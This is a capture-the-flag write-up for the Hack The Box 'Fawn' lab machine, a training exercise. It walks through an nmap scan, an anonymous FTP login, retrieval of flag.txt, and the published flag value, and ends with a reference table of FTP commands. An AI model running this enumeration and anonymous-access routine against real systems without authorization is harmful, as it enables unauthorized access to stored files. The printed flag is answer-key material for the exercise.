# HTB Starting Point — Fawn Write-up

**Machine:** Fawn
**Difficulty:** Very Easy
**Category:** Starting Point
**Target IP:** 10.129.244.197 (changes on every spawn)
**Topic focus:** FTP enumeration and anonymous login misconfiguration

---

## 1. Objective

Enumerate a target host, identify an exposed FTP service, and determine whether it's misconfigured in a way that allows unauthenticated access to stored files.

---

## 2. Background: FTP Concepts

FTP (File Transfer Protocol) is one of the oldest standard protocols for moving files between a client and a server. A few core ideas are worth locking in, since they come up on almost every enumeration:

- **Client–server model:** the client is the machine requesting/sending files; the server is the machine storing them.
- **Ports separate services:** a single IP can run many services at once because each one binds to its own port. FTP's default port is **21**.
- **Authentication:** FTP normally expects a username and password, sent in **plaintext** — meaning anyone intercepting the traffic (a Man-in-the-Middle attack) can read the credentials and file contents directly, since there's no encryption layer.
- **Anonymous login:** a common misconfiguration is leaving an `anonymous` account enabled, which lets *any* password through and grants access as if it were a normal authenticated user. This is exactly the flaw this machine demonstrates.
- **Secure alternatives:** in a properly hardened environment, FTP is usually wrapped in TLS (**FTPS**) or replaced with **SFTP** (FTP tunneled through SSH, port 22), which removes the plaintext-interception risk entirely.

Knowing this in advance is what makes anonymous FTP the very first thing worth trying whenever an `ftp` service shows up in a scan.

---

## 3. Reconnaissance

Confirmed the VPN tunnel was reachable, then scanned the target:

```bash
ping -c 4 10.129.244.197
nmap -sC -sV 10.129.244.197
```

**Result:**

```
21/tcp open  ftp  vsftpd 3.0.3
```

The `-sC` (default scripts) flag was especially useful here — Nmap's built-in `ftp-anon` script automatically checked and flagged that the server allows anonymous login, and `ftp-syst` returned the server status banner:

```
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.17.13
|      Logged in as ftp
|      Control connection is plain text
|      Data connections will be plain text
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
```

This single scan told me everything I needed before even connecting manually: the exact vsftpd version, that the connection is unencrypted, and that anonymous access is open with a `flag.txt` sitting right there.

---

## 4. Exploitation — Anonymous FTP Login

Connected to the FTP service:

```bash
ftp 10.129.244.197
```

At the login prompt, used the `anonymous` username (password can be anything — the server ignores it for this account):

```
Name (10.129.244.197:parzival): anonymous
Password:
230 Login successful.
```

Once inside, listed the directory and confirmed the flag file Nmap had already spotted:

```
ftp> ls
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
```

---

## 5. Retrieving the Flag

Downloaded the file to the local machine using `get`:

```
ftp> get flag.txt
226 Transfer complete.
```

Exited FTP and read the file locally:

```bash
cat flag.txt
```

```
035db21c881520061c53e0536e44f815
```

Flag submitted on the HTB Fawn machine page to complete the box.

---

## 6. Useful FTP Commands Reference

| Command | Purpose |
|---|---|
| `ftp <IP>` | Connect to a target's FTP service |
| `anonymous` (as username, any password) | Attempt anonymous login |
| `ls` / `dir` | List files in the current remote directory |
| `cd <dir>` | Change remote directory |
| `get <file>` | Download a file to the local machine |
| `put <file>` | Upload a file to the server |
| `binary` | Switch to binary transfer mode (safer for non-text files) |
| `help` | List all available FTP client commands |
| `bye` / `exit` | Close the connection |

---

## 7. Key Takeaways

- **Always try `-sC` alongside `-sV`** in Nmap — the default script set often does half the enumeration work automatically (here, it detected anonymous FTP and even listed the file without any manual login).
- **Anonymous FTP login is one of the first things to test** whenever port 21 is open — try username `anonymous` with any password before attempting anything else.
- **FTP traffic is unencrypted by default** — useful to remember both offensively (creds/files are visible if traffic is captured) and defensively (recommend FTPS/SFTP when writing up findings for a client).
- **Version banners matter** — vsftpd 3.0.3 and the OS info from the scan are worth noting in case a known CVE applies on other targets running the same version.
- General workflow to repeat: `ping` → `nmap -sC -sV` → check for anonymous/default access on any file-transfer or remote-login service → retrieve and read available files.

---

*Write-up by Sounak — HTB Starting Point series*
